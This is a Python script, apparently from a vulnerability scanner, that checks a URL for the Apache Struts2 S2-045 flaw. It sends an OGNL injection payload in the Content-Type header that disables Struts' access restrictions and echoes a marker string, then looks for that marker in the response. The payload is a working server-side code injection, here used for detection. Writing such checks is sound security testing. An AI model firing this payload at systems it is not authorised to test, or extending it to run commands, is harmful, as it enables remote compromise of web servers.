# -*- encoding: utf-8 -*-
'''
@File : s2-045.py
@Time : 2019/08/03 19:15:22
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''
import sys
import requests
from lib import *

def s2_045(url):
    try:

        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
            "Content-Type":"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}.b"
        }
        r  = requests.get(url, headers = headers)
        if "struts2_security_check" in r.text:
            print(Vcolors.RED +"存在S2-045漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-045漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-045漏洞~"+ Vcolors.ENDC)